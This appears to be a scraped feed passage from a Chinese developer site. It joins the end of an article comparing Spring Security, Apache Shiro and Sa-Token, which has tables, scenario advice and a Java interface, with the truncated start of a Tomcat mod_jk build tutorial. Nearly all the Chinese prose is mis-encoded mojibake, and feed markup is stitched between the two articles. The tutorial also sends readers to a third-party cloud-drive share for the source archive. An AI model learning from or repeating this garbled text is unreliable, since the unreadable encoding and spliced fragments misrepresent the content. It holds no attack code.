<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c659ee10212142dca4427b30d9d06a55~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767613200&amp;x-signature=sSb%2BHG2SL%2BGExFCQE2vL7X2g%2BAc%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-18">5.1 è¯¦ç»†å¯¹æ¯”è¡¨</h3>

































































<table><thead><tr><th>ç»´åº¦</th><th><strong>Spring Security</strong></th><th><strong>Apache Shiro</strong></th><th><strong>Sa-Token</strong></th></tr></thead><tbody><tr><td><strong>å­¦ä¹ æ›²çº¿</strong></td><td>é™¡å³­ â­â­â­â­â­</td><td>ä¸­ç­‰ â­â­â­â˜†â˜†</td><td>å¹³ç¼“ â­â­â˜†â˜†â˜†</td></tr><tr><td><strong>é…ç½®å¤æ‚åº¦</strong></td><td>å¤æ‚ â­â­â­â­â­</td><td>ä¸­ç­‰ â­â­â­â˜†â˜†</td><td>ç®€å• â­â˜†â˜†â˜†â˜†</td></tr><tr><td><strong>åŠŸèƒ½å®Œæ•´æ€§</strong></td><td>å…¨é¢ â­â­â­â­â­</td><td>å®Œæ•´ â­â­â­â­â˜†</td><td>ä¸°å¯Œ â­â­â­â˜†â˜†</td></tr><tr><td><strong>Springç”Ÿæ€é›†æˆ</strong></td><td>åŸç”Ÿ â­â­â­â­â­</td><td>è‰¯å¥½ â­â­â­â˜†â˜†</td><td>è‰¯å¥½ â­â­â­â˜†â˜†</td></tr><tr><td><strong>æ€§èƒ½å¼€é”€</strong></td><td>è¾ƒé«˜ â­â­â­â˜†â˜†</td><td>ä¸­ç­‰ â­â­â­â˜†â˜†</td><td>è¾ƒä½ â­â­â˜†â˜†â˜†</td></tr><tr><td><strong>ç¤¾åŒºæ´»è·ƒåº¦</strong></td><td>æ´»è·ƒ â­â­â­â­â­</td><td>ä¸€èˆ¬ â­â­â­â˜†â˜†</td><td>å¢é•¿ â­â­â­â˜†â˜†</td></tr><tr><td><strong>æ–‡æ¡£è´¨é‡</strong></td><td>ä¼˜ç§€ï¼ˆè‹±æ–‡ï¼‰â­â­â­â­â­</td><td>è‰¯å¥½ â­â­â­â˜†â˜†</td><td>ä¼˜ç§€ï¼ˆä¸­æ–‡ï¼‰â­â­â­â­â­</td></tr><tr><td><strong>æ‰©å±•æ€§</strong></td><td>å¼ºå¤§ â­â­â­â­â­</td><td>è‰¯å¥½ â­â­â­â˜†â˜†</td><td>ä¸€èˆ¬ â­â­â­â˜†â˜†</td></tr><tr><td><strong>ä¼ä¸šçº§ç‰¹æ€§</strong></td><td>ä¸°å¯Œ â­â­â­â­â­</td><td>æœ‰é™ â­â­â˜†â˜†â˜†</td><td>æœ‰é™ â­â­â˜†â˜†â˜†</td></tr></tbody></table>
<h3 data-id="heading-19">5.2 æŠ€æœ¯ç‰¹æ€§è¯¦ç»†å¯¹æ¯”</h3>



























































<table><thead><tr><th>ç‰¹æ€§</th><th>Spring Security</th><th>Apache Shiro</th><th>Sa-Token</th></tr></thead><tbody><tr><td><strong>è®¤è¯æ–¹å¼</strong></td><td>è¡¨å•ã€Basicã€OAuth2ã€LDAPã€SAMLç­‰</td><td>è¡¨å•ã€Basicã€CASç­‰</td><td>è¡¨å•ã€è‡ªå®šä¹‰</td></tr><tr><td><strong>æˆæƒæ¨¡å‹</strong></td><td>RBACã€ABACã€æ–¹æ³•çº§ã€URLçº§</td><td>RBACã€URLçº§ã€æ–¹æ³•çº§</td><td>RBACã€æ–¹æ³•çº§</td></tr><tr><td><strong>ä¼šè¯ç®¡ç†</strong></td><td>æ”¯æŒï¼Œä¸Spring Sessioné›†æˆ</td><td>å¼ºå¤§ï¼Œè‡ªå¸¦ä¼šè¯ç®¡ç†</td><td>æ”¯æŒï¼Œç®€å•æ˜“ç”¨</td></tr><tr><td><strong>å¯†ç åŠ å¯†</strong></td><td>å¤šç§åŠ å¯†æ–¹å¼æ”¯æŒ</td><td>å¤šç§åŠ å¯†æ–¹å¼æ”¯æŒ</td><td>æ”¯æŒ</td></tr><tr><td><strong>ç¼“å­˜æ”¯æŒ</strong></td><td>éœ€è¦è‡ªè¡Œé›†æˆSpring Cache</td><td>å†…ç½®ç¼“å­˜æ”¯æŒ</td><td>æ”¯æŒRedisç­‰</td></tr><tr><td><strong>å•ç‚¹ç™»å½•</strong></td><td>é€šè¿‡Spring Security OAuth2</td><td>éœ€è¦é¢å¤–æ¨¡å—</td><td>éœ€è¦é¢å¤–æ¨¡å—</td></tr><tr><td><strong>å¾®æœåŠ¡æ”¯æŒ</strong></td><td>ä¼˜ç§€ï¼Œä¸Spring Cloud GateWayé›†æˆ</td><td>ä¸€èˆ¬</td><td>æ”¯æŒ</td></tr><tr><td><strong>ç›‘æ§ç®¡ç†</strong></td><td>ä¸Spring Boot Actuatoré›†æˆ</td><td>éœ€è¦è‡ªè¡Œå®ç°</td><td>ç®€å•ç›‘æ§</td></tr></tbody></table>
<h2 data-id="heading-20">6 å¦‚ä½•åšå‡ºæœ€ä½³é€‰æ‹©ï¼Ÿ</h2>
<p>é¢å¯¹ä¸‰ä¸ªå„æœ‰ä¼˜åŠ£çš„æ¡†æ¶ï¼Œå¦‚ä½•åšå‡ºæœ€é€‚åˆè‡ªå·±é¡¹ç›®çš„é€‰æ‹©ï¼Ÿ</p>
<p>æˆ‘æ€»ç»“äº†ä¸€ä¸ªå†³ç­–æµç¨‹å›¾ï¼Œå¸®åŠ©ä½ åœ¨ä¸åŒåœºæ™¯ä¸‹åšå‡ºæ˜æ™ºå†³ç­–ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4ee998750388478c84fbd1b221a5ccd9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767613200&amp;x-signature=Bu0r3mNtagDvb1jQH%2BFTw0mhQrY%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-21">6.1 å…·ä½“åœºæ™¯å»ºè®®</h3>
<h4 data-id="heading-22">åœºæ™¯ä¸€ï¼šå¤§å‹ç”µå•†å¹³å°ï¼ˆé€‰æ‹©Spring Securityï¼‰</h4>
<ul>
<li><strong>ç†ç”±</strong>ï¼šéœ€è¦å®Œå–„çš„OAuth2ç¤¾äº¤ç™»å½•ã€æ”¯ä»˜å®‰å…¨ã€é£æ§ç³»ç»Ÿ</li>
<li><strong>å®æ–½è¦ç‚¹</strong>ï¼š
<ol>
<li>ä½¿ç”¨Spring Security OAuth2 Clienté›†æˆç¬¬ä¸‰æ–¹ç™»å½•</li>
<li>è‡ªå®šä¹‰å®‰å…¨è¿‡æ»¤å™¨å®ç°é£æ§é€»è¾‘</li>
<li>ä¸Spring Cloud Gatewayæ•´åˆå®ç°ç»Ÿä¸€è®¤è¯</li>
<li>ä½¿ç”¨Method Securityæ³¨è§£å®ç°ç»†ç²’åº¦æƒé™æ§åˆ¶</li>
</ol>
</li>
</ul>
<h4 data-id="heading-23">åœºæ™¯äºŒï¼šä¼ä¸šå†…éƒ¨ç®¡ç†ç³»ç»Ÿï¼ˆé€‰æ‹©Apache Shiroï¼‰</h4>
<ul>
<li><strong>ç†ç”±</strong>ï¼šæƒé™æ¨¡å‹ç›¸å¯¹å›ºå®šï¼Œéœ€è¦å¿«é€Ÿå¼€å‘ï¼Œå›¢é˜Ÿç†Ÿæ‚‰Shiro</li>
<li><strong>å®æ–½è¦ç‚¹</strong>ï¼š
<ol>
<li>ä½¿ç”¨INIé…ç½®æ–‡ä»¶å¿«é€Ÿå®šä¹‰URLæƒé™è§„åˆ™</li>
<li>é›†æˆEhcacheç¼“å­˜æƒé™æ•°æ®æå‡æ€§èƒ½</li>
<li>è‡ªå®šä¹‰Realmè¿æ¥ä¼ä¸šLDAP/ADåŸŸ</li>
<li>åˆ©ç”¨Shiroæ ‡ç­¾åœ¨é¡µé¢ä¸Šæ§åˆ¶å…ƒç´ æ˜¾ç¤º</li>
</ol>
</li>
</ul>
<h4 data-id="heading-24">åœºæ™¯ä¸‰ï¼šåˆ›ä¸šå…¬å¸MVPäº§å“ï¼ˆé€‰æ‹©Sa-Tokenï¼‰</h4>
<ul>
<li><strong>ç†ç”±</strong>ï¼šéœ€è¦å¿«é€Ÿä¸Šçº¿éªŒè¯æƒ³æ³•ï¼Œå›¢é˜Ÿè§„æ¨¡å°ï¼Œè¿½æ±‚å¼€å‘æ•ˆç‡</li>
<li><strong>å®æ–½è¦ç‚¹</strong>ï¼š
<ol>
<li>åˆ©ç”¨Sa-Tokençš„é›¶é…ç½®ç‰¹æ€§å¿«é€Ÿæ­å»º</li>
<li>ä½¿ç”¨æ³¨è§£æ–¹å¼å®ç°åŸºæœ¬æƒé™æ§åˆ¶</li>
<li>é›†æˆRediså®ç°åˆ†å¸ƒå¼ä¼šè¯</li>
<li>åˆ©ç”¨Sa-Tokençš„è¸¢äººåŠŸèƒ½å®ç°åŸºç¡€ç®¡ç†</li>
</ol>
</li>
</ul>
<h4 data-id="heading-25">åœºæ™¯å››ï¼šå¾®æœåŠ¡æ¶æ„ç³»ç»Ÿï¼ˆæ··åˆæ–¹æ¡ˆï¼‰</h4>
<ul>
<li><strong>ç†ç”±</strong>ï¼šä¸åŒæœåŠ¡æœ‰ä¸åŒçš„å®‰å…¨éœ€æ±‚</li>
<li><strong>å®æ–½è¦ç‚¹</strong>ï¼š
<ol>
<li><strong>ç½‘å…³å±‚</strong>ï¼šSpring Security + OAuth2ï¼ˆç»Ÿä¸€è®¤è¯ï¼‰</li>
<li><strong>æ ¸å¿ƒä¸šåŠ¡æœåŠ¡</strong>ï¼šSpring Securityï¼ˆç»†ç²’åº¦æ§åˆ¶ï¼‰</li>
<li><strong>å†…éƒ¨ç®¡ç†æœåŠ¡</strong>ï¼šApache Shiroï¼ˆç®€å•æƒé™ï¼‰</li>
<li><strong>å·¥å…·ç±»å¾®æœåŠ¡</strong>ï¼šSa-Tokenï¼ˆå¿«é€Ÿå¼€å‘ï¼‰</li>
</ol>
</li>
</ul>
<h3 data-id="heading-26">6.2 å¦‚æœé€‰é”™äº†æ€ä¹ˆåŠï¼Ÿ</h3>
<p>æœ‰äº›å°ä¼™ä¼´å¯èƒ½ä¼šé‡åˆ°è¿™æ ·çš„æƒ…å†µï¼šé¡¹ç›®åˆæœŸé€‰å‹ä¸åˆé€‚ï¼Œéšç€ä¸šåŠ¡å‘å±•éœ€è¦è¿ç§»åˆ°å…¶ä»–æ¡†æ¶ã€‚</p>
<p>è¿™é‡Œæä¾›ä¸€äº›è¿ç§»å»ºè®®ï¼š</p>
<ol>
<li><strong>æ¸è¿›å¼è¿ç§»</strong>ï¼šæ–°æ—§æ¡†æ¶å¹¶è¡Œï¼Œé€æ­¥æ›¿æ¢</li>
<li><strong>æŠ½è±¡éš”ç¦»å±‚</strong>ï¼šåˆ›å»ºç»Ÿä¸€çš„å®‰å…¨æ¥å£ï¼Œåº•å±‚å®ç°å¯æ›¿æ¢</li>
<li><strong>åˆ†æ¨¡å—è¿ç§»</strong>ï¼šæŒ‰ä¸šåŠ¡æ¨¡å—é€ä¸ªè¿ç§»ï¼Œé™ä½é£é™©</li>
<li><strong>å……åˆ†æµ‹è¯•</strong>ï¼šç‰¹åˆ«æ˜¯è¾¹ç¼˜æ¡ˆä¾‹å’Œæƒé™ç»„åˆåœºæ™¯</li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// æŠ½è±¡å®‰å…¨æ¥å£ç¤ºä¾‹</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">SecurityService</span> {
    <span class="hljs-comment">// è®¤è¯ç›¸å…³</span>
    <span class="hljs-type">boolean</span> <span class="hljs-title function_">login</span><span class="hljs-params">(String username, String password)</span>;
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">logout</span><span class="hljs-params">()</span>;
    <span class="hljs-type">boolean</span> <span class="hljs-title function_">isAuthenticated</span><span class="hljs-params">()</span>;
    
    <span class="hljs-comment">// æˆæƒç›¸å…³</span>
    <span class="hljs-type">boolean</span> <span class="hljs-title function_">hasPermission</span><span class="hljs-params">(String permission)</span>;
    <span class="hljs-type">boolean</span> <span class="hljs-title function_">hasRole</span><span class="hljs-params">(String role)</span>;
    
    <span class="hljs-comment">// ç”¨æˆ·ä¿¡æ¯</span>
    Object <span class="hljs-title function_">getCurrentUser</span><span class="hljs-params">()</span>;
    Long <span class="hljs-title function_">getCurrentUserId</span><span class="hljs-params">()</span>;
}

<span class="hljs-comment">// Spring Securityå®ç°</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SpringSecurityServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">SecurityService</span> {
    <span class="hljs-comment">// å®ç°åŸºäºSpring Securityçš„æ¥å£</span>
}

<span class="hljs-comment">// éœ€è¦è¿ç§»æ—¶ï¼Œåªéœ€å®ç°æ–°çš„å®ç°ç±»</span>
<span class="hljs-meta">@Service</span>  
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SaTokenServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">SecurityService</span> {
    <span class="hljs-comment">// å®ç°åŸºäºSa-Tokençš„æ¥å£</span>
    <span class="hljs-comment">// ä¸šåŠ¡ä»£ç æ— éœ€ä¿®æ”¹ï¼Œåªéœ€åˆ‡æ¢å®ç°</span>
}
</code></pre>
<h2 data-id="heading-27">æ€»ç»“</h2>
<p>ç»è¿‡æ·±å…¥åˆ†æï¼Œæˆ‘ä»¬å¯ä»¥å¾—å‡ºä»¥ä¸‹ç»“è®ºï¼š</p>
<ol>
<li><strong>Spring Security</strong>æ˜¯<strong>ä¼ä¸šçº§é‡å‹æ­¦å™¨</strong>ï¼ŒåŠŸèƒ½å…¨é¢ä½†å¤æ‚ï¼Œé€‚åˆå¤§å‹é¡¹ç›®å’Œæœ‰ç»éªŒçš„å›¢é˜Ÿã€‚</li>
<li><strong>Apache Shiro</strong>æ˜¯<strong>çµæ´»å®ç”¨çš„è½»éª‘å…µ</strong>ï¼Œå¹³è¡¡äº†åŠŸèƒ½ä¸å¤æ‚åº¦ï¼Œé€‚åˆå¤§å¤šæ•°ä¸­å°å‹é¡¹ç›®ã€‚</li>
<li><strong>Sa-Token</strong>æ˜¯<strong>å¿«é€Ÿå¼€å‘çš„åˆ©å™¨</strong>ï¼ŒAPIç®€æ´ä½†ç”Ÿæ€ç›¸å¯¹å¹´è½»ï¼Œé€‚åˆè¿½æ±‚å¼€å‘æ•ˆç‡çš„åœºæ™¯ã€‚</li>
</ol>
<p>å®é™…ä¸Šï¼Œ<strong>æ²¡æœ‰å®Œç¾çš„æ¡†æ¶ï¼Œåªæœ‰åˆé€‚çš„æ¡†æ¶</strong>ã€‚</p>
<h2 data-id="heading-28">æœ€åè¯´ä¸€å¥(æ±‚å…³æ³¨ï¼Œåˆ«ç™½å«–æˆ‘)</h2>
<p>å¦‚æœè¿™ç¯‡æ–‡ç« å¯¹æ‚¨æœ‰æ‰€å¸®åŠ©ï¼Œæˆ–è€…æœ‰æ‰€å¯å‘çš„è¯ï¼Œå¸®å¿™å…³æ³¨ä¸€ä¸‹æˆ‘çš„åŒåå…¬ä¼—å·ï¼šè‹ä¸‰è¯´æŠ€æœ¯ï¼Œæ‚¨çš„æ”¯æŒæ˜¯æˆ‘åšæŒå†™ä½œæœ€å¤§çš„åŠ¨åŠ›ã€‚</p>
<p>æ±‚ä¸€é”®ä¸‰è¿ï¼šç‚¹èµã€è½¬å‘ã€åœ¨çœ‹ã€‚</p>
<p>å…³æ³¨å…¬ä¼—å·ï¼šã€è‹ä¸‰è¯´æŠ€æœ¯ã€‘ï¼Œåœ¨å…¬ä¼—å·ä¸­å›å¤ï¼šè¿›å¤§å‚ï¼Œå¯ä»¥å…è´¹è·å–æˆ‘æœ€è¿‘æ•´ç†çš„10ä¸‡å­—çš„é¢è¯•å®å…¸ï¼Œå¥½å¤šå°ä¼™ä¼´é è¿™ä¸ªå®å…¸æ‹¿åˆ°äº†å¤šå®¶å¤§å‚çš„offerã€‚</p>
<p>æ›´å¤šé¡¹ç›®å®æˆ˜åœ¨æˆ‘çš„æŠ€æœ¯ç½‘ç«™ï¼š<a href="https://link.juejin.cn?target=http%3A%2F%2Fwww.susan.net.cn%2Fproject" title="https://link.juejin.cn?target=http%3A%2F%2Fwww.susan.net.cn%2Fproject" target="_blank">www.susan.net.cn/project</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Tomcat Connectors 1.2.32 æºç ç¼–è¯‘å®‰è£…æ•™ç¨‹ï¼ˆå« mod_jk é…ç½®æ­¥éª¤ï¼‰]]></title>    <link>https://juejin.cn/post/7589093939656507444</link>    <guid>https://juejin.cn/post/7589093939656507444</guid>    <pubDate>2025-12-29T11:43:36.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589093939656507444" data-draft-id="7589104492882673716" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Tomcat Connectors 1.2.32 æºç ç¼–è¯‘å®‰è£…æ•™ç¨‹ï¼ˆå« mod_jk é…ç½®æ­¥éª¤ï¼‰"/> <meta itemprop="keywords" content="Tomcat"/> <meta itemprop="datePublished" content="2025-12-29T11:43:36.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç”¨æˆ·613541146016"/> <meta itemprop="url" content="https://juejin.cn/user/1602431422584832"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Tomcat Connectors 1.2.32 æºç ç¼–è¯‘å®‰è£…æ•™ç¨‹ï¼ˆå« mod_jk é…ç½®æ­¥éª¤ï¼‰
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1602431422584832/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç”¨æˆ·613541146016
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T11:43:36.000Z" title="Mon Dec 29 2025 11:43:36 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>â€‹</p>
<p><strong>1. å‡†å¤‡ç¯å¢ƒ</strong></p>
<p>å…ˆè£…å¥½è¿™äº›ä¸œè¥¿ï¼š</p>
<ul>
<li><strong>Apache HTTP Server</strong>ï¼ˆå°±æ˜¯ Apacheï¼‰</li>
<li><strong>Tomcat</strong></li>
<li>ç¼–è¯‘å™¨ï¼š<strong>gcc</strong>ã€<strong>make</strong></li>
<li>Java å¼€å‘ç¯å¢ƒï¼ˆJDKï¼‰</li>
</ul>
<p>åœ¨ Ubuntu/Debian ä¸Šä½ å¯ä»¥è¿™ä¹ˆè£…ï¼š</p>
<pre><code class="hljs language-sql" lang="sql">sudo apt <span class="hljs-keyword">update</span>
sudo apt install build<span class="hljs-operator">-</span>essential apache2 tomcat9 openjdk<span class="hljs-number">-11</span><span class="hljs-operator">-</span>jdk
</code></pre>
<p><img src="" alt="" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<hr/>
<h3 data-id="heading-0">2. ä¸‹è½½å¹¶è§£å‹æºç </h3>
<p><strong>å®‰è£…åŒ…ä¸‹è½½ï¼š</strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fpan.quark.cn%2Fs%2F220ddde3d4ce" title="https://pan.quark.cn/s/220ddde3d4ce" target="_blank" ref="nofollow noopener noreferrer">pan.quark.cn/s/220ddde3dâ€¦</a>****ï¼Œå‡è®¾ä½ å·²ç»ä¸‹è½½äº†Â <code>tomcat-connectors-1.2.32-src.tar.gz</code>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">tar -xzf tomcat-connectors-1.2.32-src.tar.gz
<span class="hljs-built_in">cd</span> tomcat-connectors-1.2.32-src/native
</code></pre>
<p><img src="" alt="" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<hr/>
<h3 data-id="heading-1">3. è®¾ç½®ç¯å¢ƒå˜é‡</h3>
<p>è¦è®©ç¼–è¯‘çŸ¥é“ Apache å’Œ Tomcat åœ¨å“ªï¼Œå¾—è®¾ç½®å‡ ä¸ªå˜é‡ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">export</span> <span class="hljs-variable constant_">APACHE_HOME</span>=<span class="hljs-regexp">/usr/</span>local/apache2   # æˆ–è€…ä½  <span class="hljs-title class_">Apache</span> å®é™…å®‰è£…è·¯å¾„
<span class="hljs-keyword">export</span> <span class="hljs-variable constant_">TOMCAT_HOME</span>=<span class="hljs-regexp">/usr/</span>share/tomcat9   # æˆ–è€…ä½  <span class="hljs-title class_">Tomcat</span> çš„è·¯å¾„
<span class="hljs-keyword">export</span> <span class="hljs-variable constant_">JAVA_HOME</span>=<span class="hljs-regexp">/usr/</span>lib/jvm/java-<span class="hljs-number">11</span>-openjdk-amd64
</code></pre>
<p><img src="" alt="" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<blockquote>
<p>æ³¨æ„ï¼šè·¯å¾„è¦æ ¹æ®ä½ è‡ªå·±ç³»ç»Ÿå®é™…æƒ…å†µæ”¹ã€‚</p>
</blockquote>
<hr/>
<h3 data-id="heading-2">4. é…ç½®å’Œç¼–è¯‘</h3>
<p>è¿›å…¥ native ç›®å½•åæ‰§è¡Œï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript">./configure --<span class="hljs-keyword">with</span>-apxs=<span class="hljs-regexp">/usr/</span>bin/apxs2
make
</code></pre>
<p><img src="" alt="" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<ul>
<li><code>--with-apxs</code>æ˜¯æŒ‡å®š apxs å·¥å…·çš„è·¯å¾„ï¼Œä¸€èˆ¬åœ¨Â <code>/usr/bin/apxs2</code>æˆ–Â <code>/usr/bin/apxs</code></li>
<li>å¦‚æœæç¤ºæ‰¾ä¸åˆ° apxsï¼Œå¯ä»¥è£…ï¼š<code>sudo apt install apache2-dev</code></li>
</ul>
<hr/>
<h3 data-id="heading-3">5. å®‰è£…æ¨¡å—</h3>
<p>ç¼–è¯‘å®Œä¼šç”Ÿæˆä¸€ä¸ªÂ <code>.so</code>æ–‡ä»¶ï¼ˆæ¯”å¦‚Â <code>mod_jk.so</code>ï¼‰ï¼ŒæŠŠå®ƒå¤åˆ¶åˆ° Apache çš„æ¨¡å—ç›®å½•ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">sudo <span class="hljs-built_in">cp</span> apache-2.0/mod_jk.so /usr/lib/apache2/modules/
</code></pre>
<p><img src="" alt="" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<hr/>
<h3 data-id="heading-4">6. é…ç½® Apache åŠ è½½ mod_jk</h3>
<p>ç¼–è¾‘ Apache é…ç½®æ–‡ä»¶ï¼ˆæ¯”å¦‚Â <code>/etc/apache2/apache2.conf</code>æˆ–æ–°å»ºä¸€ä¸ªÂ <code>/etc/apache2/mods-available/jk.load</code>ï¼‰ï¼š</p>
